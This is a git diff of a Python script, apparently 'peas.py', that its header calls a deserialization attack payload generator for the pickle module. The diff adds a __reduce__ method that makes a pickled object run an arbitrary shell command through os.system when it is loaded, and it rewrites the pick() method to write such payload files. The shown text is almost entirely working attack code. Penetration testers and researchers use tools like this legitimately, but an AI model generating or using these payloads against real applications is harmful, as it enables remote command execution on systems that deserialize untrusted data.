@@ -1,3 +1,4 @@
+# Python Deserialization attack payload file generator for pickle module by j0lt
 # Requirements : Python 3
 # Usage : python peas.py
 
@@ -12,7 +13,7 @@ class Payload(object):
         self.location = location
 
     def pick(self):
-        by = pickle.dumps((os.system, (self.cmd,)))
+        by = pickle.dumps(Payload(self.cmd, self.location))
         open(self.location.__add__("_pick"), "wb").write(by)
 
     def ya(self):
@@ -21,6 +22,9 @@ class Payload(object):
     def __add__(self, other):
 
         return self+other
+    
+    def __reduce__(self):
+        return os.system, (self.cmd,)
 
 
 if __name__ == "__main__":
